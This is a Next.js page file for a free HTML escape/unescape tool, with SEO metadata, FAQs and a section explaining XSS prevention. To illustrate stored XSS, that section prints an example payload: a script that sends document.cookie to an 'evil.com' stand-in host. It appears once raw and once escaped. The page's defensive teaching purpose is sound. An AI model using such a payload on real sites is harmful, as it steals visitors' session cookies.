import type { Metadata } from "next"
import dynamic from "next/dynamic"
import { ToolPageLayout } from "@/components/common/tool-page-layout"
import { ToolLoader } from "@/components/common/tool-loader"
import { createToolConfig } from "@/lib/create-tool-config"

const HtmlEscape = dynamic(
  () =>
    import("@/components/web-tools/html-escape").then((mod) => mod.HtmlEscape),
  { loading: () => <ToolLoader /> }
)

const toolConfig = createToolConfig({
  toolName: "HTML Escape Unescape",
  description:
    "Escape special HTML characters to entities and unescape entities back to plain text.",
  metaTitle: "HTML Escape & Unescape — Convert HTML Entities (XSS-Safe)",
  metaDescription:
    "Free HTML escape / unescape tool. Convert special characters &lt; &gt; &amp; &quot; &apos; to / from safe HTML entities. For XSS prevention, code snippet display, template debugging. Supports named, numeric, and hex entities. 100% client-side.",
  path: "/web-tools/html-escape",

  header: {
    title: "HTML Escape Unescape",
    description:
      "Convert special HTML characters like <, >, &, double quotes, and apostrophes to safe HTML entities (&lt; &gt; &amp;) for XSS prevention and code display — or decode HTML entities back to readable plain text for content migration and template debugging.",
    titleSize: "medium",
    descriptionSize: "small",
  },

  breadcrumbs: [
    { label: "Web Tools", href: "/web-tools" },
    { label: "HTML Escape Unescape", href: "/web-tools/html-escape" },
  ],

  schemaOptions: {
    applicationCategory: "DeveloperApplication",
    description:
      "Escape and unescape HTML entities in-browser for safe output rendering.",
    alternateName: [
      "HTML Entity Encoder",
      "HTML Entity Decoder",
      "HTML Entities Converter",
      "Escape HTML Online",
      "HTML Special Chars Tool",
    ],
    featureList: [
      "Escape: convert special chars (`<`, `>`, `&`, `\"`, `'`) to HTML entities",
      "Unescape: decode HTML entities back to original characters",
      "Support for named entities (`&amp;`, `&copy;`, `&trade;`)",
      "Numeric character references: decimal (`&#60;`) and hex (`&#x3C;`)",
      "Unicode-aware: handles non-ASCII chars correctly",
      "Live conversion as you type — instant feedback",
      "Auto-detect: paste text and the tool figures out direction",
      "Bulk mode: paste a long block, get the full converted output",
      "XSS-safety mode: encodes everything needed to display user input safely",
      "Code snippet mode: encodes only what's needed to display in `<pre>` blocks",
      "100% client-side — text never sent to a server",
    ],
    offers: {
      "@type": "Offer",
      price: "0",
      priceCurrency: "USD",
    },
  },

  content: {
    definition:
      "An HTML Escape Tool is a free tool that converts special characters (<, >, &, \", ') into HTML entities and decodes HTML entities back to their original characters.",
    quickAnswer:
      "Paste text containing HTML special characters to escape them into safe entity codes (&lt; &gt; &amp;), or paste escaped HTML to decode it back to readable characters. Essential for displaying code snippets in web pages.",
    keyTakeaways: [
      "Escapes < > & \" ' to their HTML entity equivalents",
      "Decodes HTML entities (&lt; &amp; &#39;) back to original characters",
      "Prevents XSS attacks by escaping user input before rendering",
      "Essential when embedding code snippets in HTML pages or blog posts",
      "Supports both named entities (&amp;) and numeric entities (&#38;)",
    ],
    overview:
      "This free HTML escape and unescape tool converts reserved HTML characters into safe entity codes and decodes HTML entities back to their original characters — all in your browser with zero server processing. Escape angle brackets (<, >), ampersands (&), double quotes, and single quotes into their HTML entity equivalents (&lt;, &gt;, &amp;, &quot;, &#39;) to prevent cross-site scripting (XSS) vulnerabilities when rendering user-generated content. Display code snippets safely inside blog posts, documentation pages, and CMS templates without triggering browser parsing. The unescape mode reverses the process, converting entity-encoded strings from API responses, database exports, or email templates back into human-readable text. Supports both named entities (&amp;) and numeric entities (&#38;, &#x26;) for complete HTML encoding and decoding coverage.",

    howToSteps: [
      "Paste raw HTML, code snippets, or user-generated content into the Escape panel to convert all special characters (<, >, &, quotes) into safe HTML entities.",
      "Paste entity-encoded strings from APIs, databases, or email templates into the Unescape panel to decode them back into readable plain text.",
      "Review the converted output to verify all angle brackets, ampersands, and quotation marks are properly encoded or decoded.",
      "Copy the result with one click for use in HTML templates, CMS content fields, blog posts, or application code.",
    ],

    features: [
      "Escapes all five HTML-reserved characters: < > & \" ' to their entity equivalents",
      "Unescapes both named entities (&amp;, &lt;) and numeric entities (&#38;, &#x26;) back to original characters",
      "Bidirectional escape/unescape conversion in a single interface with live preview",
      "One-click copy for paste-ready output in HTML templates, React JSX, and CMS editors",
      "100% client-side processing — your code and content never leave the browser",
      "Handles multi-line input including full HTML documents, JSON with HTML, and code blocks",
    ],

    useCases: [
      "Preventing XSS attacks by escaping user-generated content before rendering in HTML pages and web applications",
      "Displaying code snippets with angle brackets and ampersands safely inside blog posts, tutorials, and documentation",
      "Decoding HTML entities from API responses, database exports, and RSS feeds during content migration workflows",
      "Debugging double-encoding issues (&amp;lt;) in CMS templates, email HTML, and server-rendered markup",
      "Preparing escaped HTML strings for embedding in JSON payloads, XML feeds, and JavaScript template literals",
    ],

    aboutTool: (
      <div className="space-y-6 text-muted-foreground">
        <div>
          <h3 className="text-lg font-semibold text-foreground mb-2">HTML Escaping: The XSS Prevention Foundation</h3>
          <p>
            HTML escaping (also called HTML encoding or entity encoding) converts characters with special meaning in HTML markup into their entity representations. The five core characters that must be escaped:
          </p>
          <table className="w-full border-collapse text-sm mt-3">
            <thead>
              <tr className="border-b border-border">
                <th className="text-left py-2 px-2 text-foreground">Character</th>
                <th className="text-left py-2 px-2 text-foreground">Named entity</th>
                <th className="text-left py-2 px-2 text-foreground">Numeric (dec)</th>
                <th className="text-left py-2 px-2 text-foreground">Numeric (hex)</th>
                <th className="text-left py-2 px-2 text-foreground">Why escape</th>
              </tr>
            </thead>
            <tbody>
              <tr className="border-b border-border"><td className="py-2 px-2"><code>&lt;</code></td><td className="py-2 px-2"><code>&amp;lt;</code></td><td className="py-2 px-2"><code>&amp;#60;</code></td><td className="py-2 px-2"><code>&amp;#x3C;</code></td><td className="py-2 px-2">Opens HTML tags</td></tr>
              <tr className="border-b border-border"><td className="py-2 px-2"><code>&gt;</code></td><td className="py-2 px-2"><code>&amp;gt;</code></td><td className="py-2 px-2"><code>&amp;#62;</code></td><td className="py-2 px-2"><code>&amp;#x3E;</code></td><td className="py-2 px-2">Closes HTML tags</td></tr>
              <tr className="border-b border-border"><td className="py-2 px-2"><code>&amp;</code></td><td className="py-2 px-2"><code>&amp;amp;</code></td><td className="py-2 px-2"><code>&amp;#38;</code></td><td className="py-2 px-2"><code>&amp;#x26;</code></td><td className="py-2 px-2">Starts other entities</td></tr>
              <tr className="border-b border-border"><td className="py-2 px-2"><code>&quot;</code></td><td className="py-2 px-2"><code>&amp;quot;</code></td><td className="py-2 px-2"><code>&amp;#34;</code></td><td className="py-2 px-2"><code>&amp;#x22;</code></td><td className="py-2 px-2">Breaks attribute values</td></tr>
              <tr><td className="py-2 px-2"><code>&apos;</code></td><td className="py-2 px-2"><code>&amp;#39;</code> (&apos;&amp;apos;&apos; HTML5)</td><td className="py-2 px-2"><code>&amp;#39;</code></td><td className="py-2 px-2"><code>&amp;#x27;</code></td><td className="py-2 px-2">Breaks single-quoted attrs</td></tr>
            </tbody>
          </table>
          <p className="mt-3">
            Without proper escaping, user content containing these characters can be interpreted as HTML tags or JavaScript, creating <strong>Cross-Site Scripting (XSS) vulnerabilities</strong> — #2 on the OWASP Top 10.
          </p>
        </div>

        <div>
          <h3 className="text-lg font-semibold text-foreground mb-2">XSS Attack Example</h3>
          <p>Imagine a comments form that doesn&apos;t escape input. An attacker submits:</p>
          <pre className="bg-muted p-3 rounded mt-2 text-xs overflow-x-auto">
            <code>{`<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>`}</code>
          </pre>
          <p className="mt-3">When the comment renders unescaped, every visitor&apos;s browser runs the script, sending their session cookies to the attacker. With proper escaping, the same input renders harmlessly as visible text:</p>
          <pre className="bg-muted p-3 rounded mt-2 text-xs overflow-x-auto">
            <code>{`&lt;script&gt;fetch('https://evil.com/steal?cookie=' + document.cookie)&lt;/script&gt;`}</code>
          </pre>
          <p className="mt-3">
            This single defense — escape all user content before rendering — prevents ~95% of XSS attacks.
          </p>
        </div>

        <div>
          <h3 className="text-lg font-semibold text-foreground mb-2">Context-Sensitive Escaping</h3>
          <p>Different contexts require different escape strategies — naive &quot;just escape 5 chars&quot; doesn&apos;t always work:</p>
          <ul className="list-disc pl-6 mt-2 space-y-1">
            <li><strong>HTML text content:</strong> escape <code>&lt; &gt; &amp;</code> (basic XSS protection)</li>
            <li><strong>HTML attribute values:</strong> escape <code>&lt; &gt; &amp; &quot; &apos;</code> AND always quote the attribute</li>
            <li><strong>JavaScript context (inline script):</strong> use <code>JSON.stringify()</code>, not HTML escape — different encoding needed</li>
            <li><strong>CSS context (inline style):</strong> CSS escaping rules differ — avoid user input here entirely</li>
            <li><strong>URL context (href, src):</strong> use URL encoding, not HTML escape</li>
            <li><strong>Email subject:</strong> use RFC 2047 encoding for non-ASCII chars</li>
          </ul>
        </div>

        <div>
          <h3 className="text-lg font-semibold text-foreground mb-2">Modern Framework Auto-Escaping</h3>
          <p>Most modern frameworks auto-escape by default:</p>
          <ul className="list-disc pl-6 mt-2 space-y-1">
            <li><strong>React:</strong> JSX auto-escapes <code>&#123;variable&#125;</code>. <code>dangerouslySetInnerHTML</code> bypasses — only use with sanitized content.</li>
            <li><strong>Vue:</strong> <code>&#123;&#123;variable&#125;&#125;</code> auto-escapes. <code>v-html</code> bypasses.</li>
            <li><strong>Angular:</strong> <code>&#123;&#123;variable&#125;&#125;</code> auto-escapes. <code>[innerHTML]</code> sanitizes by default.</li>
            <li><strong>Django:</strong> <code>&#123;&#123;variable&#125;&#125;</code> auto-escapes in templates. <code>&#123;% autoescape off %&#125;</code> bypasses.</li>
            <li><strong>Rails:</strong> <code>&lt;%= variable %&gt;</code> auto-escapes. <code>raw()</code> or <code>.html_safe</code> bypasses.</li>
            <li><strong>Laravel Blade:</strong> <code>&#123;&#123; $variable &#125;&#125;</code> auto-escapes. <code>{`{!! $variable !!}`}</code> bypasses.</li>
          </ul>
          <p className="mt-3">
            <strong>Don&apos;t bypass auto-escaping</strong> unless you&apos;ve sanitized with a battle-tested library (DOMPurify on the client, Bleach in Python, sanitize-html in Node).
          </p>
        </div>

        <div>
          <h3 className="text-lg font-semibold text-foreground mb-2">Common HTML Entities Reference</h3>
          <ul className="list-disc pl-6 space-y-1">
            <li><code>&amp;nbsp;</code> — non-breaking space (forces no line break)</li>
            <li><code>&amp;copy;</code> — © copyright</li>
            <li><code>&amp;trade;</code> — ™ trademark</li>
            <li><code>&amp;reg;</code> — ® registered</li>
            <li><code>&amp;hellip;</code> — … horizontal ellipsis</li>
            <li><code>&amp;mdash;</code> — — em dash</li>
            <li><code>&amp;ndash;</code> — – en dash</li>
            <li><code>&amp;ldquo; &amp;rdquo;</code> — &ldquo;curly quotes&rdquo;</li>
            <li><code>&amp;laquo; &amp;raquo;</code> — « » guillemets</li>
            <li><code>&amp;euro;</code> — € euro</li>
            <li><code>&amp;pound;</code> — £ pound sterling</li>
            <li><code>&amp;times;</code> — × multiplication sign</li>
            <li><code>&amp;divide;</code> — ÷ division sign</li>
            <li><code>&amp;deg;</code> — ° degree</li>
            <li><code>&amp;micro;</code> — µ micro</li>
          </ul>
        </div>

        <div>
          <h3 className="text-lg font-semibold text-foreground mb-2">Common Bugs This Tool Catches</h3>
          <ul className="list-disc pl-6 space-y-1">
            <li><strong>Double encoding:</strong> <code>&amp;amp;lt;</code> visible in output — content was escaped twice</li>
            <li><strong>Mojibake / wrong encoding:</strong> entities show as literal &quot;&amp;amp;&quot; in browser — your HTML&apos;s charset declaration is wrong</li>
            <li><strong>Missing semicolons:</strong> <code>&amp;ampltdiv&gt;</code> won&apos;t render as a tag — strict parsers require semicolons</li>
            <li><strong>Invalid entity names:</strong> <code>&amp;copyright;</code> doesn&apos;t exist; use <code>&amp;copy;</code></li>
            <li><strong>Curly quote contamination:</strong> Microsoft Word smart quotes (&ldquo;&rdquo;) need to become &quot;&amp;ldquo;&quot;/&quot;&amp;rdquo;&quot; or straight quotes</li>
          </ul>
        </div>
      </div>
    ),

    proTip:
      "Always escape at the output boundary (right before rendering), not at input storage. This preserves raw data integrity and prevents double-encoding issues. If you see &amp;amp;lt; in your output, the content was likely escaped twice — decode once and re-escape only at the final render point.",

    faqs: [
      {
        question: "What is HTML escaping and which characters need to be escaped?",
        answer:
          "HTML escaping converts the five reserved HTML characters — < (less-than), > (greater-than), & (ampersand), \" (double quote), and ' (apostrophe) — into their entity equivalents (&lt;, &gt;, &amp;, &quot;, &#39;). This ensures browsers display them as visible text instead of interpreting them as HTML markup or JavaScript code.",
      },
      {
        question: "How does HTML escaping prevent XSS (cross-site scripting) attacks?",
        answer:
          "XSS attacks inject malicious scripts through unescaped user input rendered in HTML. When you escape characters like < and > into &lt; and &gt;, the browser displays them as text instead of executing them as script tags. This is a foundational defense layer recommended by OWASP for all web applications handling user-generated content.",
      },
      {
        question: "What is the difference between named HTML entities and numeric entities?",
        answer:
          "Named entities use human-readable labels like &amp;, &lt;, and &quot;. Numeric entities use decimal (&#38;) or hexadecimal (&#x26;) code points. Both produce the same output in browsers. This tool supports decoding all three formats back to their original characters.",
      },
      {
        question: "When should I unescape (decode) HTML entities back to plain text?",
        answer:
          "Unescape when processing API responses that return HTML-encoded data, migrating content between CMS platforms, parsing RSS or Atom feed content, debugging email templates that display entities as literal text, or comparing text that has been entity-encoded during storage or transmission.",
      },
      {
        question: "What is double encoding and how do I fix &amp;amp;lt; appearing in my HTML?",
        answer:
          "Double encoding occurs when already-escaped content gets escaped again, producing patterns like &amp;amp;lt; instead of &lt;. To fix this, decode the text once to restore the single-escaped form, then ensure your application only escapes at the final rendering boundary — not during storage or intermediate processing steps.",
      },
      {
        question: "Do React, Angular, and Vue automatically escape HTML entities?",
        answer:
          "Yes, modern frameworks auto-escape content rendered through standard bindings (JSX expressions in React, interpolation in Angular/Vue). However, escape bypasses like dangerouslySetInnerHTML, [innerHTML], and v-html render raw HTML without escaping, making manual escaping necessary for any user-controlled content passed through these APIs.",
      },
      {
        question: "Is this HTML escape and unescape tool free to use?",
        answer:
          "Yes, completely free with no signup, no ads, and no usage limits. All encoding and decoding runs 100% client-side in your browser — your HTML code, content, and sensitive data are never sent to any external server.",
      },
    ],

    additionalContent: [
      {
        heading: "Characters Commonly Escaped",
        content:
          "Most workflows at minimum escape `<`, `>`, `&`, double quotes, and apostrophes. Depending on context, additional characters may also be encoded using numeric entities.",
      },
      {
        heading: "Developer Workflow Tip",
        content:
          "If rendering still looks wrong after escaping, inspect whether content was escaped twice. Double-escaped text often appears with `&amp;lt;` patterns.",
      },
    ],

    relatedTools: [
      { name: "URL Encoder Decoder", href: "/web-tools/url-encoder" },
      { name: "URL Parser", href: "/web-tools/url-parser" },
      { name: "HTML Beautifier", href: "/dev-tools/html-beautifier" },
      { name: "HTML to Markdown", href: "/dev-tools/html-to-markdown" },
      { name: "Markdown Previewer", href: "/dev-tools/markdown-previewer" },
      { name: "Base64 Encoder Decoder", href: "/dev-tools/base64-encoder" },
      { name: "Text to Unicode", href: "/converters/unicode" },
      { name: "All Web Tools", href: "/web-tools" },
    ],
  },
})

export const metadata: Metadata = toolConfig.metadata

export default function HtmlEscapePage() {
  return (
    <ToolPageLayout
      {...toolConfig.getLayoutProps(
        <div className="p-3 sm:p-4 md:p-5 rounded-lg bg-card border border-border shadow">
          <HtmlEscape />
        </div>
      )}
    />
  )
}
